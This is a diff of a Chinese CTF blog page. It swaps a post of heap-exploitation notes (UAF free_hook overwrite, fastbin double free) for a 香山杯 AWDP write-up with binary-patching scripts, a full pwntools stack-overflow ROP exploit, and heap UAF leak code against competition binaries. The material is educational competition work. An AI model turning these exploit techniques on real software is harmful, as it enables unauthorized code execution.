@@ -111,10 +111,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="https://sagiring.github.io/cn/Sagiring_markdown/堆知识合集一/">
+  <link rel="canonical" href="https://sagiring.github.io/cn/Sagiring_markdown/香山杯决赛Awdp分享/">
   <title>
     
-      堆知识合集一 - 茗茗之中的blog
+      香山杯决赛Awdp分享 - 茗茗之中的blog
     
   </title>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -320,19 +320,19 @@
     .body--light {
       /* intro-header */
       --intro-header-background-image-url-home: url('/img/header_img/my_love.png');
-      --intro-header-background-image-url-post: url('my_love1.png');
-      --intro-header-background-image-url-page: url('/my_love1.png');
+      --intro-header-background-image-url-post: url('my_love.png');
+      --intro-header-background-image-url-page: url('/my_love.png');
     }
     .body--dark {
       --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/my_love.png');
-      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('my_love1.png');
-      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/my_love1.png');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('my_love.png');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/my_love.png');
     }
 
     header.intro-header {
        /*post*/
         background-image: var(--intro-header-background-image-url-post);
-        /* background-image: url('my_love1.png'); */
+        /* background-image: url('my_love.png'); */
       
     }
 
@@ -356,11 +356,11 @@
               <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
               
             </div>
-            <h1>堆知识合集一</h1>
+            <h1>香山杯决赛Awdp分享</h1>
             <h2 class="subheading"></h2>
             <span class="meta">
               Posted by 茗 on
-              2023-08-13
+              2023-11-25
             </span>
 
 
@@ -368,11 +368,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">6</span> Minutes
+              Estimated Reading Time <span class="post-count">10</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">1.3k</span> In Total
+              Words <span class="post-count">2k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -420,216 +420,396 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1 id="堆知识合集一">堆知识合集一</h1>
-<p>由于许久没有看堆题了，打算多做点题整理整理</p>
-<p>题目方面主要以<code>hgame</code>和<code>ctf_all_in_one</code>中例题为例子</p>
-<h2 id="chunk结构">chunk结构</h2>
-<p>贴一下学习的师傅文章</p>
-<p>https://www.jianshu.com/p/484926468136</p>
-<p>https://blog.csdn.net/qq_39563369/article/details/103943077</p>
-<p>使用中的<code>chunk</code></p>
+        <h1 id="香山杯决赛awdp分享">香山杯决赛Awdp分享</h1>
+<h1 id="ezgame">ezgame</h1>
+<p>简单栈溢出，改gets，改偏移，加通防，都可以</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> AwdPwnPatcher <span class="hljs-keyword">import</span> *
+elf = AwdPwnPatcher(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
+assembly = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">mov rsi,rdi</span>
+<span class="hljs-string">xor rdi,rdi</span>
+<span class="hljs-string">mov rdx,1612</span>
+<span class="hljs-string">syscall</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+elf.patch_by_jmp(<span class="hljs-number">0x4017FF</span>, jmp_to=<span class="hljs-number">0x401809</span>, assembly=assembly)
+elf.save()</code></pre>
+<h2 id="how2stack">how2stack</h2>
+<p>简单栈溢出</p>
+<p>改read大小防御</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> AwdPwnPatcher <span class="hljs-keyword">import</span> *
+elf = AwdPwnPatcher(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
+
+assembly = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">mov eax,0x62</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+elf.patch_origin(<span class="hljs-number">0x01765</span>,<span class="hljs-number">0x00000176B</span>,assembly=assembly)
+elf.save()</code></pre>
+<p>漏洞点</p>
 <figure>
-<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813131500519.png" alt="使用中的chunk">
-<figcaption aria-hidden="true">使用中的chunk</figcaption>
+<img src="/cn/Sagiring_markdown/%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BAwdp%E5%88%86%E4%BA%AB/image-20231125113335749.png" alt="image-20231125113335749">
+<figcaption aria-hidden="true">image-20231125113335749</figcaption>
 </figure>
-<p><code>free chunk</code></p>
-<figure>
-<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813131523932.png" alt="free chunk">
-<figcaption aria-hidden="true">free chunk</figcaption>
-</figure>
-<pre><code class="hljs C"><span class="hljs-comment">/*</span>
-<span class="hljs-comment">  This struct declaration is misleading (but accurate and necessary).</span>
-<span class="hljs-comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span>
-<span class="hljs-comment">  fields at known offsets from a given base. See explanation below.</span>
-<span class="hljs-comment">*/</span>
-<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span>
+<p>攻击注意-1绕过，绕过后栈溢出。</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * 
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64,u64
 
-  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span>
-  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span>
 
-  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span>
-  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span>
-
-  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span>
-  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span>
-  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span>
-&#125;;
-</code></pre>
-<ul>
-<li><code>struct malloc_chunk*</code>是定义指针，定义的变量大小在32位系统占4个字节，在64位占8个字节。</li>
-<li><code>INTERNAL_SIZE_T</code>
-:被定义为<code>size_t</code>,在32位系统上是32位无符号整数(<code>4bytes</code>)，在64位系统上是64位无符号整数(<code>8bytes</code>)</li>
-</ul>
-<h2 id="泄露libc">泄露<code>libc</code></h2>
-<h3 id="知道libc版本">知道<code>libc</code>版本</h3>
-<p>通过将<code>freebin</code>加入到<code>unsortedbin</code>
-，此时<code>unsorted</code>的<code>freebin</code>中的<code>fd</code>即可泄露<code>libc</code>中的<code>main_arena</code>地址</p>
-<p>可通过<code>gdb</code>中的<code>vmmap</code>查看<code>libc</code>计算相对地址</p>
-<pre><code class="hljs python">main_arena_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;1.&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">3</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) 
-libc_addr = main_arena_addr - <span class="hljs-number">0x3c4b78</span>
-libc.address = libc_addr</code></pre>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230222111213954-1679370065075-1.png"></p>
-<p><code>distance</code>计算偏移</p>
-<h3 id="不知道libc版本">不知道<code>libc</code>版本</h3>
-<p>利用<code>LibcSearcher</code> 搜索
-<code>__malloc_hook</code>的地址</p>
-<pre><code class="hljs python">main_arena_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> <span class="hljs-comment">#固定的96偏移</span>
-malloc_hook_addr = main_arena_addr - <span class="hljs-number">0x10</span> <span class="hljs-comment">#再减0x10就到 __malloc_hook</span>
-libc=LibcSearcher(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>,malloc_hook_addr) <span class="hljs-comment">#LibcSearcher</span>
-offset = malloc_hook_addr - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)
-system_addr = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)
-free_hook = offset + libc.dump(<span class="hljs-string">&#x27;__free_hook&#x27;</span>)</code></pre>
-<h2 id="题目思路合集">题目思路合集</h2>
-<p>在泄露了<code>libc</code>地址之后</p>
-<h3 id="freehook-uaf----hgame-editable_note"><code>Freehook + UAF -- hgame editable_note</code></h3>
-<pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):
-    add_note(i,<span class="hljs-number">0x80</span>)
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
-    delete_note(i)
-show_note(<span class="hljs-number">7</span>)
-libc_main_arena = <span class="hljs-number">0x1ECB80</span> + <span class="hljs-number">88</span> + <span class="hljs-number">8</span>
-main_arena_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;1.&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">3</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) 
-libc_addr = main_arena_addr - libc_main_arena
-<span class="hljs-comment">#泄露libc---------------------------------------------</span>
-libc.address=libc_addr
-system_addr = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
-free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
-<span class="hljs-comment"># one_gadget_addr = libc_addr + 0xe3b04</span>
-edit_note(<span class="hljs-number">6</span>,p64(free_hook))<span class="hljs-comment">#UAF 把tcache[6]中的next指针覆写为free_hook_addr</span>
-add_note(<span class="hljs-number">9</span>,<span class="hljs-number">0x80</span>) <span class="hljs-comment">#9为从tcache[6]申请的chunk，因为覆写的是next</span>
-add_note(<span class="hljs-number">10</span>,<span class="hljs-number">0x80</span>) <span class="hljs-comment">#10为 malloc返回的free_hook的指针</span>
-edit_note(<span class="hljs-number">9</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#向system传参</span>
-edit_note(<span class="hljs-number">10</span>,p64(system_addr))<span class="hljs-comment">#向free_hook中写入system地址</span>
-delete_note(<span class="hljs-number">9</span>)</code></pre>
-<h3 id="fastbin-doublefree----hgame-fast_note"><code>FastBin + DoubleFree -- hgame fast_note</code></h3>
-<pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#大于fastbin</span>
-add(<span class="hljs-number">1</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#避免合并到top chunk</span>
-<span class="hljs-comment">#----泄露libc</span>
-
-add(<span class="hljs-number">2</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;A&#x27;</span>* <span class="hljs-number">0x50</span>)
-add(<span class="hljs-number">3</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;A&#x27;</span>* <span class="hljs-number">0x50</span>)
-add(<span class="hljs-number">4</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
-delete(<span class="hljs-number">0</span>)
-show(<span class="hljs-number">0</span>)
-
-main_arena_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;1.&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">3</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) 
-libc_addr = main_arena_addr - <span class="hljs-number">0x3c4b78</span>
-libc.address = libc_addr
-system_addr = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
-free_addr = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]
-<span class="hljs-comment">#----泄露libc</span>
-delete(<span class="hljs-number">2</span>)
-delete(<span class="hljs-number">3</span>)
-delete(<span class="hljs-number">2</span>)
-</code></pre>
-<figure>
-<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813124219781.png" alt="此时的fastbins">
-<figcaption aria-hidden="true">此时的fastbins</figcaption>
-</figure>
-<figure>
-<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813124412631.png" alt="add完后的fastbins">
-<figcaption aria-hidden="true">add完后的fastbins</figcaption>
-</figure>
-<p><code>UAF</code>解释
-此处将重新申请<code>chunk</code>并填充地址，实际上是修改了作为<code>free chunk</code>的<code>0x25fc180</code>的<code>fd</code></p>
-<p>而后再次申请便是在<code>0x25fc180</code>之后的<code>fd</code>的<code>chunk</code>便是在<code>0x601ffa</code>上了</p>
-<pre><code class="hljs python"><span class="hljs-comment">#fastbin 后进先出</span>
-<span class="hljs-comment"># 0x602018 free_got </span>
-add(<span class="hljs-number">5</span>,<span class="hljs-number">0x50</span>,p64(<span class="hljs-number">0x602002</span>-<span class="hljs-number">8</span>)) <span class="hljs-comment">#向fastbin next写入got表地址</span>
-add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;A&#x27;</span>* <span class="hljs-number">0x50</span>)
-add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;A&#x27;</span>* <span class="hljs-number">0x50</span>)
-gdb.attach(r)
-pause()
-add(<span class="hljs-number">8</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">14</span>+p64(system_addr)) <span class="hljs-comment">#申请的fastbin指向free_got</span>
-<span class="hljs-comment">#此处的14 应该为 0x602018 - 0x601ffa -0x10头大小</span>
-delete(<span class="hljs-number">4</span>)
-<span class="hljs-comment">#free且传参/bin/sh</span>
-
-<span class="hljs-comment">#---------------</span>
-<span class="hljs-comment">#此处为什么不直接用0x602018 -0x10呢？</span>
-<span class="hljs-comment">#因为要符合free chunk的申请的size验证 </span>
-<span class="hljs-comment">#利用 x /10gx 0x602018 -0x10 查看</span></code></pre>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813131022813.png"></p>
-<pre><code class="hljs c"><span class="hljs-comment">//此时size位虽然为0x3168000000000060</span>
-<span class="hljs-comment">//由于下面malloc源码中 fastbin的fastbin_index计算</span>
-<span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))
-            &#123;
-              errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;
-<span class="hljs-comment">//其中fastbin_index定义有</span>
-<span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz) \</span>
-<span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span>
-<span class="hljs-comment">//解释</span>
-<span class="hljs-comment">//宏 fastbin_index(sz)用于获得 fast bin 在 fast bins 数组中的 index，由于 bin[0]和 bin[1]中 的chunk不存在，所以需要减2，对于SIZE_SZ为4B的平台，将sz除以8减2得到fast bin index， 对于 SIZE_SZ 为 8B 的平台，将 sz 除以 16 减去 2 得到 fast bin index。</span>
+debug = <span class="hljs-number">1</span>
+gdb_is = <span class="hljs-number">0</span>
+elf_path = <span class="hljs-string">&quot;./pwn&quot;</span>
+<span class="hljs-comment"># context(arch=&#x27;i386&#x27;,os = &#x27;linux&#x27;)</span>
+context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;DEBUG&#x27;</span>)
+<span class="hljs-comment"># context(arch=&#x27;amd64&#x27;,os = &#x27;linux&#x27;)</span>
+<span class="hljs-keyword">if</span> debug:
+    context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>,<span class="hljs-string">&#x27;nt&#x27;</span>,<span class="hljs-string">&#x27;Ubuntu&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]
+    <span class="hljs-keyword">if</span> gdb_is:
+        <span class="hljs-comment"># r = gdb.debug(elf_path,&#x27;set debug-file-directory ./.debug/&#x27;)</span>
+        <span class="hljs-comment"># gdb.attach(r,&#x27;b* 0x4012ed&#x27;)</span>
+        r = process(elf_path)
+        gdb.attach(r)
+        <span class="hljs-comment"># pause()</span>
+        <span class="hljs-keyword">pass</span>
+    <span class="hljs-keyword">else</span>:
+        r = process(elf_path)
     
-<span class="hljs-comment">//同时由于(unsigned int)(sz)的原因，对应64程序只取size的低4字节，所以我们在利用寻找合适size的时候，类似这种情况（0x3168000000000060）也行，它等同于size=0x60</span>
-    
-<span class="hljs-comment">//unsigned int 在64位程序下只取低4字节</span>
-<span class="hljs-comment">//所以此处可以分配fastbin而不会报错！</span></code></pre>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230222112549250-1679370065076-3.png"></p>
-<h3 id="源码调试">源码调试</h3>
-<ol type="1">
-<li><code>pwndbg</code>自动读取工作目录下源码</li>
-<li><code>r = gdb.debug('./vuln', 'set debug-file-directory debug/')``gdb</code>启动程序，而不是<code>attach</code>，并设置调试信息</li>
-<li>放<code>glibc-all-in-one</code>的调试信息
-即<code>.debug</code>文件夹</li>
-</ol>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813181534392.png"></p>
+<span class="hljs-keyword">else</span>:
+    host = <span class="hljs-string">&quot;39.106.48.123:31571&quot;</span>
+    r = connect(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>],host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>])<span class="hljs-comment">#远程连接</span>
+    gdb_is =<span class="hljs-number">0</span>
+
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show_addr</span>(<span class="hljs-params">name,addr</span>):
+      success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(addr)&#125;</span>&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">revc_addr</span>(<span class="hljs-params">name:<span class="hljs-built_in">str</span>, until:<span class="hljs-built_in">bytes</span> =<span class="hljs-string">b&#x27;\x7f&#x27;</span>,offset:<span class="hljs-built_in">int</span> = <span class="hljs-number">0</span>,addrType:<span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;bytes&#x27;</span></span>)-&gt;<span class="hljs-built_in">int</span>:
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(until) == <span class="hljs-built_in">str</span>:
+        until = until.encode()
+    <span class="hljs-keyword">if</span> addrType == <span class="hljs-string">&#x27;bytes&#x27;</span>:
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> offset:
+            addr = u64(r.recvuntil(until).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+        <span class="hljs-keyword">else</span>:
+            addr = u64(r.recvuntil(until)[:offset].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+    <span class="hljs-keyword">elif</span> addrType == <span class="hljs-string">&#x27;str&#x27;</span>:
+        addr = <span class="hljs-built_in">int</span>(r.recvuntil(until)[<span class="hljs-number">2</span>:offset].decode(),<span class="hljs-number">16</span>)
+
+    show_addr(name,addr)
+    <span class="hljs-keyword">return</span> addr
+
+
+elf = ELF(elf_path)
+libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)
+
+r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>).encode())
+
+r.sendlineafter(<span class="hljs-string">b&#x27;Length: &#x27;</span>,<span class="hljs-string">b&#x27;-1&#x27;</span>)
+payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">99</span> + <span class="hljs-string">b&#x27;A&#x27;</span> + <span class="hljs-string">b&#x27;\xff\xff\xff\xff&#x27;</span>
+r.sendafter(<span class="hljs-string">b&#x27;Data: &#x27;</span>,payload)
+r.recvuntil(<span class="hljs-string">b&#x27;Result in hex: &#x27;</span>)
+stack_rbp_addr = <span class="hljs-built_in">int</span>(<span class="hljs-string">b&#x27;&#x27;</span>.join(r.recvuntil(<span class="hljs-string">b&#x27;7f&#x27;</span>).split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">6</span>:][::-<span class="hljs-number">1</span>]),<span class="hljs-number">16</span>)  + <span class="hljs-number">0x28</span>
+show_addr(<span class="hljs-string">&#x27;stack_rbp_addr&#x27;</span>,stack_rbp_addr)
+
+r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>).encode())
+r.sendlineafter(<span class="hljs-string">b&#x27;Length: &#x27;</span>,<span class="hljs-string">b&#x27;-1&#x27;</span>)
+payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">99</span> + <span class="hljs-string">b&#x27;A&#x27;</span> + <span class="hljs-string">b&#x27;\xff\xff\xff\xff&#x27;</span> + p64(stack_rbp_addr + <span class="hljs-number">8</span>)
+r.sendafter(<span class="hljs-string">b&#x27;Data: &#x27;</span>,payload)
+libc.address = <span class="hljs-built_in">int</span>(<span class="hljs-string">b&#x27;&#x27;</span>.join(r.recvuntil(<span class="hljs-string">b&#x27;7f&#x27;</span>).split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">6</span>:][::-<span class="hljs-number">1</span>]),<span class="hljs-number">16</span>) - <span class="hljs-number">0x24083</span>
+show_addr(<span class="hljs-string">&#x27;libc.address&#x27;</span>,libc.address)
+
+rop = ROP(libc)
+r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>).encode())
+r.sendlineafter(<span class="hljs-string">b&#x27;Length: &#x27;</span>,<span class="hljs-string">b&#x27;-1&#x27;</span>)
+rop.raw(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">99</span> + <span class="hljs-string">b&#x27;A&#x27;</span> + <span class="hljs-string">b&#x27;\xff\xff\xff\xff&#x27;</span> + p64(stack_rbp_addr)+<span class="hljs-string">b&#x27;junkjunk&#x27;</span>)
+rop.raw(rop.ret[<span class="hljs-number">0</span>])
+rop.rdi = libc.address + <span class="hljs-number">0x00001B45BD</span>
+rop.system()
+info(rop.dump())
+
+r.sendafter(<span class="hljs-string">b&#x27;Data: &#x27;</span>,rop.chain())
+
+r.interactive()</code></pre>
+<h2 id="camera">camera</h2>
+<p>改printf泄露防御，修改一下输出格式，修改%s溢出等等。正解应该是next指针置0。</p>
+<pre><code class="hljs c"><span class="hljs-comment">//改for(i = 1;;i++)</span></code></pre>
+<p>当时做题做了半天没做出来，光逆向看就很麻烦，还是得手动加加结构体，一目了然。</p>
+<h3 id="ida快捷键">IDA快捷键</h3>
+<h4 id="代码页面">代码页面</h4>
+<p>C -&gt; 将此段代码理解为Code，反汇编</p>
+<p>A -&gt; 将此段代码理解为String</p>
+<p>Y -&gt; 修改类型</p>
+<p>N -&gt; 重命名</p>
+<h4 id="结构体页面">结构体页面</h4>
+<p>D -&gt; 添加数据</p>
+<p>U -&gt; 删除数据（其实是改为undefine）</p>
+<p>Insert -&gt; 插入结构体</p>
+<h3 id="结构体构造如下">结构体构造如下</h3>
 <figure>
-<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813181949151.png" alt="成功示例">
-<figcaption aria-hidden="true">成功示例</figcaption>
+<img src="/cn/Sagiring_markdown/%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BAwdp%E5%88%86%E4%BA%AB/image-20231125114141919.png" alt="image-20231125114141919">
+<figcaption aria-hidden="true">image-20231125114141919</figcaption>
 </figure>
-<h3 id="house-of-botcake----new_fast_note"><code>House Of Botcake -- new_fast_note</code></h3>
-<pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
-    add(i,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)
+<h3 id="主要逻辑">主要逻辑</h3>
+<p>堆题有Add，Load，Show</p>
+<h4 id="add">Add</h4>
+<p><img src="/cn/Sagiring_markdown/%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BAwdp%E5%88%86%E4%BA%AB/image-20231125114510229.png"></p>
+<h4 id="load">Load</h4>
+<p><img src="/cn/Sagiring_markdown/%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BAwdp%E5%88%86%E4%BA%AB/image-20231125114539138.png"></p>
+<h4 id="show">Show</h4>
+<p><img src="/cn/Sagiring_markdown/%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BAwdp%E5%88%86%E4%BA%AB/image-20231125114553455.png"></p>
+<p>修完后，漏洞点一目了然，在Load的时候，给对应index的next指针指向了上一个Load的chunk，而且其他地方也没有做修改，造成UAF，可以Double
+Free。每次Add到相同index的值，就可以一直Free。且题目也没有清空free
+chunk，将free chunk再申请回来show，就可以泄露heap和libc</p>
+<pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
+    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;Z&#x27;</span>) <span class="hljs-comment">#0 - 6</span>
+
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) <span class="hljs-comment"># 7</span>
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;B&#x27;</span>) <span class="hljs-comment"># 8</span>
+
+
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;C&#x27;</span>) <span class="hljs-comment"># 9 # previous chunk</span>
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;D&#x27;</span>) <span class="hljs-comment"># 10 # victim chunk</span>
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;E&#x27;</span>) <span class="hljs-comment"># 11</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
+    load(i)
+    show(<span class="hljs-number">2</span>)
+
+load(<span class="hljs-number">8</span>)
+load(<span class="hljs-number">7</span>)
+load(<span class="hljs-number">6</span>)
+show(<span class="hljs-number">4</span>)
+
+add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\xf0&#x27;</span>) <span class="hljs-comment">#0</span>
+
+load(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">2</span>)
+
+libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)
+r.recvuntil(<span class="hljs-string">b&#x27;The film content: &#x27;</span>)
+libc.address = revc_addr(<span class="hljs-string">&#x27;main_neara&#x27;</span>) - <span class="hljs-number">0x1ecdf0</span>
+show_addr(<span class="hljs-string">&#x27;libc.addr&#x27;</span>,libc.address)
+
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) <span class="hljs-comment">#0</span>
+load(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">2</span>)
+r.recvuntil(<span class="hljs-string">b&#x27;The film content: &#x27;</span>)
+heap_base = revc_addr(<span class="hljs-string">&#x27;heap_chunk&#x27;</span>,<span class="hljs-string">b&#x27;Over&#x27;</span>,-<span class="hljs-number">5</span>) - <span class="hljs-number">0x741</span>
+show_addr(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)</code></pre>
+<p>然后考虑打house_of_botcake，劫持tcache。思路是先让unsortedbin合并两个0x100,再申请让tcache空出来，再DoubleFree，合并的0x200中的后一个0x100，再申请0x120,造成堆块重叠，完全控制Free的tcache。</p>
